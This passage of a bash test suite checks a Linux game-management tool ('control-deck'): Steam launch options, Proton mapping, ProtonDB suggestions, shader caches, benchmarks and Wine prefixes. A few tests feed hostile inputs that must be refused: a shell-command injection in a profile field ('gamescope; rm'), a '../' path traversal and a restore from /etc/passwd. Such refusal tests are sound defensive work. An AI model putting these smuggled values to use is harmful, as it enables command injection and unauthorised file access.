						"LaunchOptions"		"PROTON_ENABLE_WAYLAND=0 mangohud gamemoderun %command% -novid +fps_max 120"
						"BadgeData"		"0200"
					}
					"200"
					{
						"Playtime"		"5"
					}
				}
			}
		}
	}
}
EOF
cat > "$ST/config/config.vdf" <<'EOF'
"InstallConfigStore"
{
	"Software"
	{
		"Valve"
		{
			"Steam"
			{
				"AutoUpdateWindowEnabled"		"0"
			}
		}
	}
}
EOF
cat > "$ST/compatibilitytools.d/GE-Proton9-1/compatibilitytool.vdf" <<'EOF'
"compatibilitytools"
{
  "compat_tools"
  {
    "GE-Proton9-1" // Internal name of this tool
    {
      "install_path" "."
      "display_name" "GE-Proton9-1"
    }
  }
}
EOF
LC="$ST/userdata/42/config/localconfig.vdf"; CFG="$ST/config/config.vdf"
G="$("$CD" games)"
eq "tools (Proton) are not listed as games" "$(jq length <<<"$G")" 2
eq "escaped quotes in names are decoded" "$(jq -r '.[] | select(.id == "100") | .name' <<<"$G")" 'Game "Quoted" One'
eq "launch options read" "$(jq -r '.[] | select(.id == "100") | .launch' <<<"$G")" "PROTON_ENABLE_WAYLAND=0 mangohud gamemoderun %command% -novid +fps_max 120"
eq "prefix detected" "$(jq -r '.[] | select(.id == "100") | .prefix' <<<"$G")" true
TOOLS="$("$CD" compattools)"
eq "Proton tools: Experimental + GE (comment after the name ignored)" "$(jq -r 'map(.name) | join(",")' <<<"$TOOLS")" "proton_experimental,GE-Proton9-1"

section "Gaming: Steam launch options through the wrapper"
CONTROL_DECK_STEAM_RUNNING=1 "$CD" steamwrap 100 on >/dev/null 2>&1; eq "refuses while Steam is running" "$?" 3
"$CD" steamwrap 100 on >/dev/null
has "Steam launches it through the deck" "$(bash -c 'source "$1"; vdf_get "$2" UserLocalConfigStore/Software/Valve/Steam/apps/100 LaunchOptions' _ "$CD" "$LC")" "control-deck run %command%"
eq "other keys untouched" "$(bash -c 'source "$1"; vdf_get "$2" UserLocalConfigStore/Software/Valve/Steam/apps/100 BadgeData' _ "$CD" "$LC")" "0200"
yes "backup written" "[[ -f '$LC.control-deck.bak' ]]"
PR="$("$CD" gprofile get steam:100)"
eq "old options adopted: env"      "$(jq -r '.env.PROTON_ENABLE_WAYLAND' <<<"$PR")" 0
eq "old options adopted: mangohud" "$(jq -r '.mangohud' <<<"$PR")" true
eq "old options adopted: args"     "$(jq -r '.args' <<<"$PR")" "-novid +fps_max 120"
"$CD" steamwrap 100 off >/dev/null
# a profile saved BEFORE wrapping must still get the old options merged in
"$CD" gprofile reset steam:100 >/dev/null
"$CD" gprofile set steam:100 mangohud=false 'env=MY_VAR=1' >/dev/null
"$CD" steamwrap 100 on >/dev/null
PR="$("$CD" gprofile get steam:100)"
eq "pre-existing profile: old env merged in" "$(jq -r '.env.PROTON_ENABLE_WAYLAND' <<<"$PR")" 0
eq "pre-existing profile: its own env kept"  "$(jq -r '.env.MY_VAR' <<<"$PR")" 1
eq "pre-existing profile: empty args filled" "$(jq -r '.args' <<<"$PR")" "-novid +fps_max 120"
eq "pre-existing profile: mangohud from the old line" "$(jq -r '.mangohud' <<<"$PR")" true
"$CD" steamwrap 200 on >/dev/null
has "missing LaunchOptions key is created" "$(bash -c 'source "$1"; vdf_get "$2" UserLocalConfigStore/Software/Valve/Steam/apps/200 LaunchOptions' _ "$CD" "$LC")" "control-deck run"
eq "…next to the existing keys" "$(bash -c 'source "$1"; vdf_get "$2" UserLocalConfigStore/Software/Valve/Steam/apps/200 Playtime' _ "$CD" "$LC")" 5
"$CD" steamwrap 100 off >/dev/null
eq "off restores the original options" "$(bash -c 'source "$1"; vdf_get "$2" UserLocalConfigStore/Software/Valve/Steam/apps/100 LaunchOptions' _ "$CD" "$LC")" "PROTON_ENABLE_WAYLAND=0 mangohud gamemoderun %command% -novid +fps_max 120"
"$CD" steamwrap 200 off >/dev/null
hasnt "off removes options that weren't there" "$(cat "$LC")" "control-deck run"
eq "file still has balanced braces" "$(grep -c '{' "$LC")" "$(grep -c '}' "$LC")"

section "Gaming: Proton version per game"
"$CD" steamcompat 200 GE-Proton9-1 >/dev/null
eq "mapping block created" "$(bash -c 'source "$1"; vdf_get "$2" InstallConfigStore/Software/Valve/Steam/CompatToolMapping/200 name' _ "$CD" "$CFG")" GE-Proton9-1
eq "games shows it" "$("$CD" games | jq -r '.[] | select(.id == "200") | .compat')" GE-Proton9-1
"$CD" steamcompat 200 NotAProton >/dev/null 2>&1; eq "unknown tool refused" "$?" 2
"$CD" steamcompat 200 default >/dev/null
hasnt "default removes the mapping" "$(cat "$CFG")" '"200"'
eq "config braces balanced" "$(grep -c '{' "$CFG")" "$(grep -c '}' "$CFG")"

section "Gaming: profiles + run wrapper"
"$CD" gprofile set steam:200 nice=5 >/dev/null 2>&1;            eq "nice out of range refused" "$?" 2
"$CD" gprofile set steam:200 'env=BAD-NAME=1' >/dev/null 2>&1;  eq "bad env name refused" "$?" 2
"$CD" gprofile set steam:200 'prefix=gamescope; rm' >/dev/null 2>&1; eq "shell syntax in prefix refused" "$?" 2
"$CD" gprofile set steam:200 gamemode=true mangohud=false 'env=FOO=bar DXVK_HUD=fps' 'args=-windowed' >/dev/null
stub gamemoderun 'echo "gamemoderun" >> "'"$T"'/wrap.log"; exec "$@"'
printf '#!/bin/sh\necho "FOO=$FOO HUD=$DXVK_HUD args=$*"\n' > "$T/fake/game"; chmod +x "$T/fake/game"
O="$(SteamAppId=200 "$CD" run "$T/fake/game" -launcher)"
eq "wrapper applies env and appends args" "$O" "FOO=bar HUD=fps args=-launcher -windowed"
has "wrapper goes through gamemoderun" "$(cat "$T/wrap.log")" gamemoderun
O="$("$CD" run --profile default -- "$T/fake/game")"
eq "no Steam id → default profile" "$O" "FOO= HUD= args="
"$CD" gprofile reset steam:200 >/dev/null
eq "reset drops the custom profile" "$("$CD" gprofile get steam:200 | jq -r .custom)" false

section "Gaming: status + ProtonDB"
mkdir -p "$T/proc/4242" "$T/proc/4243" "$T/proc/99"
printf 'HOME=/x\0SteamAppId=100\0' > "$T/proc/4243/environ"; printf 'SteamAppId=100\0' > "$T/proc/4242/environ"
printf 'SteamAppId=0\0' > "$T/proc/99/environ"
eq "running game found once (lowest pid), id 0 ignored" "$(PROC_ROOT="$T/proc" bash -c 'source "$1"; running_games' _ "$CD")" "$(printf '100\t4242')"
yes "gstatus is valid JSON" "\"$CD\" gstatus | jq -e '.gamemode | has(\"ingroup\") and has(\"pending\")' >/dev/null"
mkdir -p "$T/pdb"; printf '{"tier":"platinum","score":0.9,"total":10,"trendingTier":"gold","confidence":"strong"}' > "$T/pdb/100.json"
export CONTROL_DECK_PROTONDB_API="file://$T/pdb"
eq "ProtonDB tier" "$("$CD" protondb 100 200 | jq -r '."100".tier')" platinum
eq "missing summary → unknown" "$("$CD" protondb 200 | jq -r '."200".tier')" unknown
rm "$T/pdb/100.json"
eq "cached for a day" "$("$CD" protondb 100 | jq -r '."100".tier')" platinum
unset CONTROL_DECK_PROTONDB_API CONTROL_DECK_STEAM_ROOT CONTROL_DECK_STEAM_RUNNING

section "Gaming: launch-option suggestions (ProtonDB open data)"
NOW=$(date +%s); OLD=$(( NOW - 5 * 365 * 86400 ))
rep() { printf '{"app":{"steam":{"appId":"%s"}},"timestamp":%s,"responses":{"verdict":"%s","launchOptions":%s},"systemInfo":{"gpu":"%s"}}' "$1" "$2" "$3" "$4" "$5"; }
{
    echo '['
    for i in 1 2 3 4 5 6 7 8; do rep 100 "$NOW" yes '"%command% -vulkan +fps_max 120"' "NVIDIA GeForce RTX 2070"; echo ,; done
    rep 100 "$NOW" yes '"PROTON_ENABLE_WAYLAND=1 gamemoderun %command% -vulkan +fps_max 120"' "NVIDIA GeForce RTX 3080"; echo ,
    rep 100 "$NOW" yes '"PROTON_ENABLE_WAYLAND=1 gamemoderun %command% -vulkan"' "AMD Radeon RX 6800"; echo ,
    rep 100 "$NOW" yes '"RADV_PERFTEST=\"gpl,nggc\" %command% -vulkan"' "AMD Radeon RX 7900"; echo ,
    rep 100 "$NOW" yes '"RADV_PERFTEST=\"gpl,nggc\" ~/lsfg %command%"' "AMD Radeon RX 7900"; echo ,
    rep 100 "$NOW" no  '"-dx11 %command%"' "NVIDIA GeForce GTX 1060"; echo ,
    rep 100 "$NOW" no  '"-dx11 %command%"' "NVIDIA GeForce GTX 1060"; echo ,
    rep 100 "$OLD" yes '"-oldflag %command%"' "NVIDIA GeForce GTX 970"; echo ,
    rep 100 "$OLD" yes '"-oldflag %command%"' "NVIDIA GeForce GTX 970"; echo ,
    rep 300 "$NOW" yes '"%command% -windowed"' "Intel Arc"; echo ,
    rep 300 "$NOW" yes '"%command% -windowed"' "Intel Arc"; echo ,
    rep 200 "$NOW" yes '""' "NVIDIA"
    echo ']'
} > "$T/reports_piiremoved.json"
mkdir -p "$T/pdbdump"; (cd "$T" && tar czf "$T/pdbdump/reports_sep1_2026.tar.gz" reports_piiremoved.json)
export CONTROL_DECK_GPU_VENDOR=nvidia CONTROL_DECK_GPU_NAME="NVIDIA GeForce RTX 2070" CONTROL_DECK_SCREEN=""
eq "no index → says so" "$("$CD" gsuggest 100 | jq -r .index)" false
CONTROL_DECK_PDB_RAW="file://$T/pdbdump" CONTROL_DECK_PDB_DUMP=reports_sep1_2026.tar.gz "$CD" pdbindex update >/dev/null 2>&1
eq "index built (reports with launch options only)" "$("$CD" pdbindex status | jq -r .reports)" 18
eq "games counted" "$("$CD" pdbindex status | jq -r .games)" 2
S="$("$CD" gsuggest 100)"
sug() { jq -r --arg t "$1" '[.suggestions[] | select(.token == $t)] | first | if . == null then "none" else "\(.share)/\(.vshare)/\(.foryou)" end' <<<"$S"; }
eq "only working, recent reports (12 of 16)" "$(jq -r .reports <<<"$S")" 12
eq "-vulkan: share / NVIDIA share / fits" "$(sug -vulkan)" "91/100/true"
eq "+cvar value kept as one option" "$(sug '+fps_max 120')" "75/100/true"
eq "env var suggested" "$(sug PROTON_ENABLE_WAYLAND=1)" "16/11/true"
eq "AMD-only variable hidden on NVIDIA (0 % of NVIDIA players)" "$(sug RADV_PERFTEST=gpl,nggc)" none
eq "…and shown on AMD, quotes stripped" "$(CONTROL_DECK_GPU_VENDOR=amd CONTROL_DECK_GPU_NAME="AMD Radeon RX 7900 XTX" "$CD" gsuggest 100 | jq -r '.suggestions[] | select(.token == "RADV_PERFTEST=gpl,nggc") | .foryou')" true
# shellcheck disable=SC2088  # a literal "~/lsfg" token, as players write it
eq "personal paths never suggested" "$(sug '~/lsfg')" none
eq "reports saying it doesn't work are ignored" "$(sug -dx11)" none
eq "reports older than 3 years ignored when there are enough recent ones" "$(sug -oldflag)" none
eq "wrapper suggested" "$(sug gamemoderun)" "16/11/true"
eq "few reports → all-time window" "$("$CD" gsuggest 300 | jq -r '.window + " " + (.suggestions[0].token)')" "all -windowed"
unset CONTROL_DECK_GPU_VENDOR CONTROL_DECK_GPU_NAME CONTROL_DECK_SCREEN

section "Gaming: suggestions adapt to this PC's hardware"
gen() { bash -c 'source "$1"; jq -Rr "$JQ_GPU_GEN"" gpu_gen" <<<"$2"' _ "$CD" "$1"; }
eq "RTX 2070 → NVIDIA gen 3"            "$(gen 'NVIDIA GeForce RTX 2070')" nvidia:3
eq "GTX 1660 = same gen as RTX 20"      "$(gen 'NVIDIA GeForce GTX 1660 SUPER')" nvidia:3
eq "RX 9070 XT → AMD gen 5 (RDNA4)"     "$(gen 'AMD Radeon RX 9070 XT')" amd:5
eq "Steam Deck = RDNA2 like RX 6000"    "$(gen 'AMD Custom GPU 0405 (vangogh)')" amd:3
eq "unknown GPU → no generation"        "$(gen 'Intel UHD Graphics 630')" ""
# a game where the right option depends on the GPU generation and on the CPU
{
    echo '['
    for i in 1 2 3 4 5 6; do rep 400 "$NOW" yes '"%command% -vulkan -threads 32"' "NVIDIA GeForce RTX 2080"; echo ,; done
    for i in 1 2 3 4 5 6; do rep 400 "$NOW" yes '"%command% -dx11 -w 1770 -h 996"' "NVIDIA GeForce RTX 4090"; echo ,; done
    for i in 1 2 3 4 5 6; do rep 400 "$NOW" yes '"RADV_PERFTEST=gpl mangohud %command%"' "AMD Radeon RX 9070 XT"; echo ,; done
    rep 400 "$NOW" yes '"%command% -threads 6"' "AMD Radeon RX 7800 XT"
    echo ']'
} > "$T/reports_piiremoved.json"
(cd "$T" && tar czf "$T/pdbdump/reports_oct1_2026.tar.gz" reports_piiremoved.json)
CONTROL_DECK_PDB_RAW="file://$T/pdbdump" CONTROL_DECK_PDB_DUMP=reports_oct1_2026.tar.gz "$CD" pdbindex update >/dev/null 2>&1
hw() { CONTROL_DECK_GPU_NAME="$1" CONTROL_DECK_GPU_VENDOR="$2" CONTROL_DECK_SCREEN="$3" "$CD" gsuggest 400; }
R="$(jq -r '[.suggestions[] | select(.recommended) | .token] | join(",")' <<<"$(hw 'NVIDIA GeForce RTX 2070' nvidia 1920x1080)")"
has   "RTX 2070: -vulkan recommended (RTX 20-30 players)" "$R" "-vulkan"
hasnt "RTX 2070: RTX 40 players' -dx11 not recommended"   "$R" "-dx11"
eq    "RTX 2070: -threads adapted to this CPU" "$(hw 'NVIDIA GeForce RTX 2070' nvidia 1920x1080 | jq -r '.suggestions[] | select(.key == "-threads #") | .token')" "-threads $(nproc)"
R="$(jq -r '[.suggestions[] | select(.recommended) | .token] | join(",")' <<<"$(hw 'NVIDIA GeForce RTX 4090' nvidia 2560x1440)")"
has   "RTX 4090: -dx11 recommended" "$R" "-dx11"
eq    "resolution adapted to this screen" "$(hw 'NVIDIA GeForce RTX 4090' nvidia 2560x1440 | jq -r '[.suggestions[] | select(.key == "-w #" or .key == "-h #") | .token] | sort | join(" ")')" "-h 1440 -w 2560"
eq    "no screen known → resolution options dropped" "$(hw 'NVIDIA GeForce RTX 4090' nvidia '' | jq '[.suggestions[] | select(.key == "-w #")] | length')" 0
R="$(jq -r '[.suggestions[] | select(.recommended) | .token] | join(",")' <<<"$(hw 'AMD Radeon RX 9070 XT' amd 1920x1080)")"
has   "RX 9070 XT: AMD-only variable recommended there" "$R" "RADV_PERFTEST=gpl"
hasnt "RX 9070 XT: NVIDIA players' -vulkan not recommended" "$R" "-vulkan"
eq    "…and hidden on NVIDIA" "$(hw 'NVIDIA GeForce RTX 2070' nvidia 1920x1080 | jq '[.suggestions[] | select(.token == "RADV_PERFTEST=gpl")] | length')" 0
eq    "similar-hardware label" "$(hw 'NVIDIA GeForce RTX 2070' nvidia 1920x1080 | jq -r .similarLabel)" "GTX 10, RTX 20 / GTX 16, RTX 30"
eq    "library badge counts recommended options" "$(CONTROL_DECK_GPU_NAME='NVIDIA GeForce RTX 2070' CONTROL_DECK_GPU_VENDOR=nvidia CONTROL_DECK_SCREEN=1920x1080 "$CD" gtips 400 | jq -r '."400"')" 2
# env vars vs their default, numeric options grouped, fps cap → refresh rate
{
    echo '['
    for i in 1 2 3 4; do rep 500 "$NOW" yes '"PROTON_ENABLE_WAYLAND=1 %command%"' "NVIDIA GeForce RTX 2070"; echo ,; done
    for f in 144 60 240 144 144; do rep 500 "$NOW" yes "\"%command% +fps_max $f\"" "NVIDIA GeForce RTX 2080"; echo ,; done
    rep 500 "$NOW" yes '"%command% -foo"' "NVIDIA GeForce RTX 3070"; echo ,
    rep 500 "$NOW" yes '"%command% -foo"' "NVIDIA GeForce RTX 3070"; echo ,
    for i in 1 2 3 4 5 6; do rep 600 "$NOW" yes '"DXVK_ASYNC=1 %command%"' "NVIDIA GeForce RTX 2070"; echo ,; done
    for i in 1 2 3 4; do rep 600 "$NOW" yes '"%command% -bar"' "NVIDIA GeForce RTX 2070"; echo ,; done
    rep 600 "$NOW" yes '"%command% -bar"' "NVIDIA GeForce RTX 2070"
    echo ']'
} > "$T/reports_piiremoved.json"
(cd "$T" && tar czf "$T/pdbdump/reports_nov1_2026.tar.gz" reports_piiremoved.json)
CONTROL_DECK_PDB_RAW="file://$T/pdbdump" CONTROL_DECK_PDB_DUMP=reports_nov1_2026.tar.gz "$CD" pdbindex update >/dev/null 2>&1
g5() { CONTROL_DECK_GPU_NAME='NVIDIA GeForce RTX 2070' CONTROL_DECK_GPU_VENDOR=nvidia CONTROL_DECK_SCREEN=1920x1080 CONTROL_DECK_SCREEN_HZ="$2" "$CD" gsuggest "$1"; }
eq "env var set by a minority: not recommended (most keep the default)" "$(g5 500 120 | jq -r '.suggestions[] | select(.var == "PROTON_ENABLE_WAYLAND") | "\(.pct)/\(.unset)/\(.recommended)"')" "36/63/false"
eq "env var set by most players: recommended" "$(g5 600 120 | jq -r '.suggestions[] | select(.var == "DXVK_ASYNC") | "\(.pct)/\(.recommended)"')" "54/true"
eq "+fps_max values grouped and set to this monitor's refresh rate" "$(g5 500 120 | jq -r '.suggestions[] | select(.key == "+fps_max #") | "\(.token) \(.pct)% \(.recommended)"')" "+fps_max 120 45% true"
eq "refresh rate unknown → the most common value" "$(g5 500 '' | jq -r '.suggestions[] | select(.key == "+fps_max #") | .token')" "+fps_max 144"

section "Gaming: new games are recognised"
export CONTROL_DECK_STEAM_ROOT="$ST" CONTROL_DECK_STEAM_RUNNING=0
rm -f "$HOME/.local/share/control-deck/gaming/known-games.txt"
"$CD" games >/dev/null; sleep 0.3
eq "first run: nothing is new" "$("$CD" games | jq '[.[] | select(.new)] | length')" 0
man 300 "Fresh Install" FreshInstall 10
eq "a game installed later is flagged new" "$("$CD" games | jq -r '.[] | select(.id == "300") | .new')" true
"$CD" gseen steam:300
eq "opening it clears the flag" "$("$CD" games | jq -r '.[] | select(.id == "300") | .new')" false
unset CONTROL_DECK_STEAM_ROOT CONTROL_DECK_STEAM_RUNNING

section "Gaming: shader caches"
export CONTROL_DECK_STEAM_ROOT="$ST" CONTROL_DECK_STEAM_RUNNING=0 CONTROL_DECK_PACMAN_LOG="$T/pacman-drv.log"
SCD="$ST/steamapps/shadercache"
mkdir -p "$SCD/100/fozpipelinesv6" "$SCD/100/nvidiav1/GLCache" "$SCD/200/nvidiav1/GLCache" "$SCD/999/fozpipelinesv6" "$HOME/.cache/nvidia/GLCache"
head -c 3000 /dev/zero > "$SCD/100/fozpipelinesv6/steam_pipeline_cache.foz"
head -c 2000 /dev/zero > "$SCD/100/nvidiav1/GLCache/old.bin"
head -c 1000 /dev/zero > "$SCD/200/nvidiav1/GLCache/fresh.bin"
head -c 500  /dev/zero > "$SCD/999/fozpipelinesv6/x.foz"
head -c 700  /dev/zero > "$HOME/.cache/nvidia/GLCache/g.bin"
touch -d '2026-01-01' "$SCD/100/nvidiav1/GLCache/old.bin" "$HOME/.cache/nvidia/GLCache/g.bin"
touch -d '2026-06-01' "$SCD/200/nvidiav1/GLCache/fresh.bin"
echo '[2026-03-10T10:00:00+0100] [ALPM] upgraded nvidia-utils (600.1-1 -> 610.2-1)' > "$T/pacman-drv.log"
echo '[2026-03-11T10:00:00+0100] [ALPM] upgraded firefox (1-1 -> 2-1)' >> "$T/pacman-drv.log"
SC="$("$CD" shadercache)"
eq "last driver update read from pacman.log (other packages ignored)" "$(jq -r '.lastDriverUpdate | strftime("%Y-%m-%d")' <<<"$SC")" 2026-03-10
eq "parts split: pipelines / driver" "$(jq -r '.games[] | select(.id == "100") | "\(.pipelines)/\(.driver)"' <<<"$SC")" "3000/2000"
eq "driver cache untouched since the update → stale" "$(jq -r '.games[] | select(.id == "100") | .stale' <<<"$SC")" true
eq "driver cache used since the update → not stale" "$(jq -r '.games[] | select(.id == "200") | .stale' <<<"$SC")" false
eq "cache of an uninstalled game is an orphan" "$(jq -r '.games[] | select(.id == "999") | .installed' <<<"$SC")" false
eq "global NVIDIA cache found and stale" "$(jq -r '.global[] | select(.id == "nvidia") | .stale' <<<"$SC")" true
eq "stale bytes (game driver cache + global)" "$(jq -r .staleBytes <<<"$SC")" 2700
FAKE_FOSSILIZE=1 "$CD" shaderclean orphans >/dev/null 2>&1; eq "refuses while Steam compiles shaders" "$?" 3
PROC_ROOT="$T/proc" "$CD" shaderclean steam:100 driver >/dev/null 2>&1; eq "refuses while that game runs" "$?" 3
"$CD" shaderclean steam:100 driver >/dev/null
yes "driver part emptied, pipelines kept" "[[ -z \"\$(ls -A '$SCD/100/nvidiav1')\" && -f '$SCD/100/fozpipelinesv6/steam_pipeline_cache.foz' ]]"
"$CD" shaderclean orphans >/dev/null
yes "orphan cache removed" "[[ ! -e '$SCD/999' ]]"
"$CD" shaderclean stale >/dev/null
yes "stale global cache emptied, folder kept" "[[ -d '$HOME/.cache/nvidia/GLCache' && -z \"\$(ls -A '$HOME/.cache/nvidia/GLCache')\" ]]"
yes "fresh driver cache kept" "[[ -f '$SCD/200/nvidiav1/GLCache/fresh.bin' ]]"
"$CD" shaderclean steam:200 all >/dev/null
yes "all: every part of that game gone" "[[ -d '$SCD/200' && -z \"\$(ls -A '$SCD/200')\" ]]"
"$CD" shaderclean 'steam:../x' >/dev/null 2>&1; eq "bad target refused" "$?" 2
unset CONTROL_DECK_STEAM_ROOT CONTROL_DECK_STEAM_RUNNING CONTROL_DECK_PACMAN_LOG

section "Gaming: A/B benchmark"
export CONTROL_DECK_STEAM_ROOT="$ST" CONTROL_DECK_STEAM_RUNNING=0
mh_csv() {   # file frametime… — a MangoHud 0.8 per-frame log
    local out="$1" ft; shift
    mkdir -p "$(dirname "$out")"
    { echo "os,cpu,gpu,ram,kernel,driver,cpuscheduler"; echo "Arch,CPU,GPU,16,6.x,,schedutil"
      echo "fps,frametime,cpu_load,cpu_power,gpu_load,cpu_temp,gpu_temp,gpu_core_clock,gpu_mem_clock,gpu_vram_used,gpu_power,ram_used,swap_used,process_rss,cpu_mhz,elapsed"
      for ft in "$@"; do echo "0,$ft,20,0,90,60,70,0,0,0,0,0,0,0,0,0"; done; } > "$out"
}
fts=(); for i in $(seq 990); do fts+=(10); done; for i in $(seq 10); do fts+=(40); done; fts+=(99999)
mh_csv "$T/bench.csv" "${fts[@]}"
BS="$(bash -c 'source "$1"; bench_stats "$2"' _ "$CD" "$T/bench.csv")"
eq "frames (pause over 5 s dropped)" "$(jq -r .frames <<<"$BS")" 1000
eq "average FPS"  "$(jq -r .avgFps <<<"$BS")" 97.1
eq "1 % low"      "$(jq -r .low1 <<<"$BS")" 25
eq "p99 frametime" "$(jq -r .p99ms <<<"$BS")" 10
eq "spikes counted" "$(jq -r .spikes <<<"$BS")" 10
eq "loads averaged" "$(jq -r '"\(.cpuLoad)/\(.gpuLoad)"' <<<"$BS")" "20/90"
"$CD" bench set steam:100 duration=3 >/dev/null 2>&1; eq "duration below 5 s refused" "$?" 2
"$CD" bench set steam:100 A 'env=X=1' >/dev/null
"$CD" bench set steam:100 duration=30 delay=10 A label=stock B label=wayland 'env=PROTON_ENABLE_WAYLAND=1' 'args=-vulkan' >/dev/null
eq "variants saved" "$("$CD" bench get steam:100 | jq -r '"\(.A.label)/\(.B.label)/\(.B.env)/\(.duration)"')" "stock/wayland/PROTON_ENABLE_WAYLAND=1/30"
"$CD" steamwrap 100 off >/dev/null 2>&1
"$CD" bench run steam:100 B >/dev/null 2>&1; eq "run refused unless Steam launches it through the deck" "$?" 3
"$CD" steamwrap 100 on >/dev/null
rm -f "$T/steam.log"
"$CD" bench run steam:100 B >/dev/null
has "run launches the game through Steam" "$(cat "$T/steam.log" 2>/dev/null)" "steam://rungameid/100"
printf '#!/bin/sh\necho "MH=$MANGOHUD_CONFIG W=$PROTON_ENABLE_WAYLAND args=$*"\n' > "$T/fake/bgame"; chmod +x "$T/fake/bgame"
O="$(SteamAppId=100 "$CD" run "$T/fake/bgame")"
has "armed launch logs frames into the variant folder" "$O" "output_folder=$HOME/.local/share/control-deck/gaming/bench/steam_100/B,autostart_log=10,log_duration=30"
has "variant env applied" "$O" "W=1"
has "variant args applied" "$O" "args=-vulkan"
O="$(SteamAppId=100 "$CD" run "$T/fake/bgame")"
hasnt "armed only once: the next launch is normal" "$O" "output_folder="
mapfile -t fts < <(for i in $(seq 100); do echo 20; done)
mh_csv "$HOME/.local/share/control-deck/gaming/bench/steam_100/A/game_1.csv" "${fts[@]}"
mapfile -t fts < <(for i in $(seq 100); do echo 10; done)
mh_csv "$HOME/.local/share/control-deck/gaming/bench/steam_100/B/game_2.csv" "${fts[@]}"
BG="$("$CD" bench get steam:100)"
eq "A vs B compared (B doubles the FPS)" "$(jq -r '"\(.results.A.avgFps) \(.results.B.avgFps) \(.compare.avgFps)%"' <<<"$BG")" "50 100 100%"
"$CD" bench set steam:100 B proton=NotAProton >/dev/null 2>&1; eq "unknown Proton refused" "$?" 2
"$CD" bench set steam:100 B proton=GE-Proton9-1 >/dev/null
CONTROL_DECK_STEAM_RUNNING=1 "$CD" bench run steam:100 B >/dev/null 2>&1; eq "Proton variant needs Steam closed" "$?" 3
"$CD" bench run steam:100 B >/dev/null
eq "Proton switched for the run" "$(bash -c 'source "$1"; vdf_get "$2" InstallConfigStore/Software/Valve/Steam/CompatToolMapping/100 name' _ "$CD" "$ST/config/config.vdf")" GE-Proton9-1
eq "original Proton remembered" "$("$CD" bench get steam:100 | jq -r .originalProton)" default
"$CD" bench restore steam:100 >/dev/null
hasnt "restore puts the default back" "$(cat "$ST/config/config.vdf")" '"100"'
"$CD" bench clear steam:100 >/dev/null
eq "clear drops the results" "$("$CD" bench get steam:100 | jq -r '.results.A')" null
unset CONTROL_DECK_STEAM_ROOT CONTROL_DECK_STEAM_RUNNING

section "Gaming: Wine/Proton prefixes"
export CONTROL_DECK_STEAM_ROOT="$ST" CONTROL_DECK_STEAM_RUNNING=0
mkpfx() { mkdir -p "$1/drive_c/windows"; printf 'WINE REGISTRY Version 2\n#arch=win64\n' > "$1/system.reg"; head -c 1000 /dev/zero > "$1/drive_c/file"; [[ -n "${2:-}" ]] && echo "$2" > "$1/../version" || true; }
CD_=$ST/steamapps/compatdata
mkpfx "$CD_/100/pfx" GE-Proton9-1; mkpfx "$CD_/777/pfx"; mkpfx "$CD_/1493710/pfx"; mkpfx "$CD_/0/pfx"
mkdir -p "$CD_/888/pfx"   # incomplete: not a prefix
mkpfx "$HOME/Games/umbral/battlenet"; mkpfx "$HOME/.wine"
PX="$("$CD" prefixes)"
k() { jq -r --arg n "$1" '.prefixes[] | select(.name == $n) | .'"$2" <<<"$PX"; }
eq "Steam prefix named after its game" "$(jq -r '.prefixes[] | select(.id == "100") | .name' <<<"$PX")" 'Game "Quoted" One'
eq "Proton version read" "$(jq -r '.prefixes[] | select(.id == "100") | .version' <<<"$PX")" GE-Proton9-1
eq "uninstalled game's prefix is an orphan" "$(jq -r '.prefixes[] | select(.id == "777") | .orphan' <<<"$PX")" true
eq "a tool's prefix is not an orphan" "$(jq -r '.prefixes[] | select(.id == "1493710") | .kind' <<<"$PX")" tool
eq "compatdata/0 is Steam's shared prefix" "$(jq -r '.prefixes[] | select(.id == "0") | .kind' <<<"$PX")" shared
eq "folders without system.reg/drive_c ignored" "$(jq '[.prefixes[] | select(.id == "888")] | length' <<<"$PX")" 0
eq "standalone prefixes in ~/Games and ~/.wine found" "$(k battlenet owner)/$(k .wine owner)" "wine/wine"
eq "architecture read" "$(k battlenet arch)" win64
mkdir -p "$T/proc/5000"; printf 'WINEPREFIX=%s\0' "$HOME/Games/umbral/battlenet" > "$T/proc/5000/environ"
eq "prefix in use detected" "$(PROC_ROOT="$T/proc" "$CD" prefixes | jq -r '.prefixes[] | select(.name == "battlenet") | .running')" true
PROC_ROOT="$T/proc" "$CD" prefix delete "$HOME/Games/umbral/battlenet" >/dev/null 2>&1; eq "busy prefix can't be deleted" "$?" 3
"$CD" prefix delete "$HOME" >/dev/null 2>&1; eq "arbitrary folders refused" "$?" 2
export CONTROL_DECK_PREFIX_BACKUPS="$T/pbak"
"$CD" prefix backup "$HOME/Games/umbral/battlenet" >/dev/null
B="$(ls "$T/pbak"/wine-battlenet-*.tar.* 2>/dev/null | head -1)"
yes "backup archive written" "[[ -s '$B' ]]"
"$CD" prefix clone "$HOME/Games/umbral/battlenet" "$HOME/Games/clone1" >/dev/null
yes "clone is a full prefix" "[[ -f '$HOME/Games/clone1/system.reg' && -f '$HOME/Games/clone1/drive_c/file' ]]"
"$CD" prefix clone "$HOME/Games/umbral/battlenet" "$HOME/Games/clone1" >/dev/null 2>&1; eq "clone onto an existing folder refused" "$?" 2
"$CD" prefix restore "$B" "$HOME/Games/restored" >/dev/null
yes "restore recreates the prefix" "[[ -f '$HOME/Games/restored/system.reg' ]]"
"$CD" prefix restore /etc/passwd "$HOME/Games/x" >/dev/null 2>&1; eq "restore only from the deck's backups" "$?" 2
"$CD" prefix delete "$CD_/777" >/dev/null
yes "Steam orphan deleted as a whole compatdata folder" "[[ ! -e '$CD_/777' ]]"
yes "…after an automatic backup" "ls '$T/pbak'/steam-uninstalled_app_777-* >/dev/null"
eq "backups listed" "$("$CD" prefix backups | jq length)" 2
unset CONTROL_DECK_STEAM_ROOT CONTROL_DECK_STEAM_RUNNING CONTROL_DECK_PREFIX_BACKUPS

section "Gaming: Umbral games"
export CONTROL_DECK_STEAM_ROOT="$ST" CONTROL_DECK_STEAM_RUNNING=0 CONTROL_DECK_UMBRAL_CONFIG="$T/umbral.json"
mkpfx "$HOME/Games/umbral/game-2"; mkdir -p "$HOME/Games/umbral/games/Poke"; head -c 5000 /dev/zero > "$HOME/Games/umbral/games/Poke/Game.exe"
cat > "$T/umbral.json" <<EOF
{"prefixes":[{"id":"battlenet","name":"Battle.net","path":"$HOME/Games/umbral/battlenet","runner":"UMU-Proton-10.0-4"},
             {"id":"p-game-2","name":"Game","path":"$HOME/Games/umbral/game-2/","runner":"GE-Proton"}],
 "games":[{"id":"battlenet","name":"Battle.net","kind":"battlenet","prefix_id":"battlenet","exe":""},
          {"id":"battlenet:wow","name":"WoW","kind":"blizzard","prefix_id":"battlenet","exe":"/nope/WowB.exe","playtime":29},
